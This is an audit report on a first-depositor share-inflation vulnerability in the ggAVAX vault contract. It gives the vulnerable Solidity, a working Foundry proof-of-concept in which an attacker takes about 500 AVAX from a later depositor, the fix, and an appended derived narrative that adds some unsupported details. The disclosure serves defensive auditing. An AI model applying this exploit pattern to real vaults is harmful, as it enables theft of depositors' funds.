---
id: 17256
severity: "High"
---

# Inflation of ggAVAX share price by first depositor

## Description

Inflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.

Impact:

1. Early depositor will be able steal other depositors funds
2. Exchange rate is inflated. As a result depositors are not able to deposit small funds.

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days. This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).

```solidity
function syncRewards() public {
----------
    // Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.
    uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;
---------
}
```

Therefore:

* The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next `rewardsCycleEnd` will be.
* The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.

Edge case example:  
`syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later. `(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`

Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.

```solidity
function depositAVAX() public payable returns (uint256 shares) {
------
    if ((shares = previewDeposit(assets)) == 0) {
        revert ZeroShares();
    }
------
}
```

`previewDeposit` and `convertToShares`:  

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
function previewDeposit(uint256 assets) public view virtual returns (uint256) {
    return convertToShares(assets);
}
```

## Proof of Concept

If `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.  
The depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.

When the attacker front-runs the creation of the vault, the attacker:

1. Calls `depositAVAX` to receive 1 share
2. Transfers `WAVAX` to `ggAVAX`
3. Calls `syncRewards` to inflate exchange rate

The issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`.  
When the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.

Add the following test to `TokenggAVAX.t.sol`: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108>
    
```solidity
function testShareInflation() public {
    uint256 depositAmount = 1;
    uint256 aliceDeposit = 2000 ether;
    uint256 donationAmount = 1000 ether;
    vm.deal(bob, donationAmount  + depositAmount);
    vm.deal(alice, aliceDeposit);
    vm.warp(1672876799);

    // create new ggAVAX
    ggAVAXImpl = new TokenggAVAX();
    ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));
    ggAVAX.initialize(store, ERC20(address(wavax)));

    // Bob deposits 1 WEI of AVAX
    vm.prank(bob);
    ggAVAX.depositAVAX{value: depositAmount}();
    // Bob transfers 1000 AVAX to vault
    vm.startPrank(bob);
    wavax.deposit{value: donationAmount}();
    wavax.transfer(address(ggAVAX), donationAmount);
    vm.stopPrank();
    // Bob Syncs rewards
    ggAVAX.syncRewards();

    // 1 second has passed
    // This can range between 0-14 days. Every seconds, exchange rate rises
    skip(1 seconds);

    // Alice deposits 2000 AVAX
    vm.prank(alice);
    ggAVAX.depositAVAX{value: aliceDeposit}();

    //Expectet revert when any depositor deposits less then 1000 AVAX
    vm.expectRevert(bytes4(keccak256("ZeroShares()")));
    ggAVAX.depositAVAX{value: 10 ether}();

    // Bob withdraws maximum assests for his share
    uint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);
    vm.prank(bob);
    ggAVAX.withdrawAVAX(maxWithdrawAssets);

    //Validate bob has withdrawn 1500 AVAX 
    assertEq(bob.balance, 1500 ether);

    // Alice withdraws maximum assests for her share
    maxWithdrawAssets = ggAVAX.maxWithdraw(alice);
    ggAVAX.syncRewards(); // to update accounting
    vm.prank(alice);
    ggAVAX.withdrawAVAX(maxWithdrawAssets);

    // Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)
    assertEq(alice.balance, 1500 ether + 1);
}
```

To run the POC, execute:
    
```bash
forge test -m testShareInflation -v
```

Expected output:
    
```
Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest
[PASS] testShareInflation() (gas: 3874399)
Test result: ok. 1 passed; 0 failed; finished in 8.71s
```

## Recommendation

When creating the vault add initial funds in order to make it harder to inflate the price. Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).

The Warden has shown how, by performing a small deposit, followed by a transfer, shares can be rebased, causing a grief in the best case, and complete fund loss in the worst case for every subsequent depositor.

While the finding is fairly known, it’s impact should not be understated, and because of this I agree with High Severity.

I recommend watching this presentation by Riley Holterhus which shows possible mitigations for the attack: <https://youtu.be/_pO2jDgL0XE?t=601>

Initialize ggAVAX with a deposit: [multisig-labs/gogopool#49](https://github.com/multisig-labs/gogopool/pull/49)

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an inflation of the ggAVAX share price that can be triggered by the very first depositor after the vault contract is deployed. The contract calculates share amounts with the formula assets * totalSupply / totalAssets, but when totalSupply is zero the function returns the raw asset amount. An attacker can therefore deposit a single wei of AVAX and receive one share while the vault still holds no assets. After obtaining this share, the attacker donates a large amount of WAVAX to the vault and immediately calls syncRewards. Because syncRewards aligns the next reward‑cycle end to the nearest multiple of the 14‑day cycle, the attacker can call it again after only a few seconds, causing the totalAssets value to increase while totalSupply stays almost unchanged. This skews the exchange rate (share price) upward, inflating the value of each share. Subsequent users who try to deposit any amount smaller than the attacker’s donation encounter a previewDeposit that returns zero shares, triggering a ZeroShares revert. From the user’s perspective deposits suddenly fail, balances appear to disappear, and withdrawals return far less than expected. The impact is that the early depositor can effectively steal funds from later depositors, and the protocol’s accounting assumptions about a stable share‑to‑asset ratio are broken. The issue only manifests when the vault is created without an initial seed of assets, and when syncRewards can be called with a very short interval between cycles – conditions that are easy to satisfy because the contract does not enforce a minimum initial liquidity or a minimum time gap between reward cycles. The problem was discovered during a formal audit and reproduced with a Forge test that front‑runs the vault creation, performs a minimal deposit, donates assets, and repeatedly calls syncRewards to inflate the price. The bug is subtle because the share price looks correct at first glance; only after a second‑level timing manipulation does the exchange rate diverge, making the exploit hard to notice without detailed accounting checks. To remediate the issue the vault should be seeded with a non‑zero amount of assets during initialization, preventing the zero‑supply branch from being used, or the conversion logic should be changed to reject deposits when totalSupply is zero. Additionally, syncRewards should enforce a minimum interval or be restricted until the vault has a healthy liquidity pool, thereby eliminating the ability to inflate the share price through rapid successive calls.
